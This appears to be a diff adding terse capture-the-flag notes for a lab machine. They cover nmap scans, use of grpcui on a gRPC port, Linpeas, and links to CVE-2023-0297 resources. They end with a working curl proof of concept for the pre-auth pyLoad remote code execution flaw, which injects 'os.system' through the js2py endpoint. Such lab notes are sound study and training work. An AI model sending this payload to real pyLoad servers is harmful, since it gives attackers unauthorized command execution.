@@ -1,0 +1,28 @@
+#nmap by root
+sudo su
+nmap -sC -sV 10.10.11.214
+nmap -p- 10.10.11.214
+
+sudo apt install golang-go
+
+#install grpcui golang
+https://github.com/fullstorydev/grpcui/tree/master
+
+grpcui -plaintext 10.10.11.214:50051
+
+
+Linpeas.sh
+https://www.rapid7.com/db/modules/exploit/linux/http/pyload_js2py_exec/
+
+
+https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
+
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://<target>/flash/addcrypted2'
+
+
+
+
+
+
